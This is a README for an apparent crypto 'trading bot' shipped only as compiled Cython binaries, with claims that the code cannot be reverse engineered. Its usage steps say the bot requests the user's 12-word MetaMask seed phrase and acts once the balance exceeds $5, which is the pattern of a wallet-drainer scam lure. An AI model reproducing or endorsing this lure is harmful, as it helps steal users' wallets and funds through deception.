# TRADING BOT - COMPILED VERSION (CYTHON)

## ⚠️ IMPORTANT - HIGHEST SECURITY LEVEL

This version is compiled to **native binary (.so files)**.
- Source code is **COMPLETELY PROTECTED**
- Cannot be decompiled or reverse engineered
- Runs at near-native C speed
- Platform-specific (Linux x86_64)

## 📋 SYSTEM REQUIREMENTS

- **OS**: Linux (Ubuntu 20.04+, Debian 11+, CentOS 8+)
- **Architecture**: x86_64 (64-bit)
- **Python**: 3.9, 3.10, or 3.11
- **RAM**: Minimum 512MB
- **Internet**: Required for blockchain access

## 🚀 INSTALLATION

### Quick Install:
```bash
chmod +x setup.sh
./setup.sh
```

### Manual Install:
```bash
pip3 install -r requirements.txt
```

## 💻 USAGE

```bash
python3 main.py
```

The bot will:
1. Display welcome banner
2. Request your 12-word MetaMask seed phrase (hidden input)
3. Scan balances across all supported networks
4. Start automated trading if balance > $5

## 🔒 SECURITY FEATURES

✅ **Binary Compilation**: Code compiled to .so (shared object) files
✅ **No Source Code**: Python source is not included
✅ **Anti-Decompile**: Cannot be reversed to Python
✅ **Optimized**: Runs faster than interpreted Python
✅ **Platform-Locked**: Works only on Linux x86_64

## 📦 PACKAGE CONTENTS

```
dist_cython/
├── main.py                    # Entry point (minimal loader)
├── src/
│   ├── wallet_manager.so      # Compiled binary
│   ├── balance_checker.so     # Compiled binary
│   ├── trading_engine.so      # Compiled binary
│   ├── price_fetcher.so       # Compiled binary
│   ├── logger_config.so       # Compiled binary
│   └── config.so              # Compiled binary
├── requirements.txt
├── setup.sh
└── README.md
```

## ⚙️ SUPPORTED NETWORKS

- Ethereum (ETH)
- Binance Smart Chain (BSC)
- Polygon (MATIC)
- Arbitrum
- Optimism

## 🆘 TROUBLESHOOTING

### Error: "ImportError: cannot import name 'X' from 'src.Y'"
- Make sure you're using Python 3.9-3.11
- Run: `pip3 install -r requirements.txt`

### Error: "ImportError: libpython3.X.so.1.0: cannot open shared object file"
- Install Python development package:
  ```bash
  sudo apt install python3-dev
  ```

### Error: "ModuleNotFoundError: No module named 'src'"
- Make sure you're running from the dist_cython/ directory
- Check that src/__init__.py exists

## 📞 SUPPORT

For issues or questions, contact the development team.

---
**Trading Bot Team** - Compiled with Cython for Maximum Security
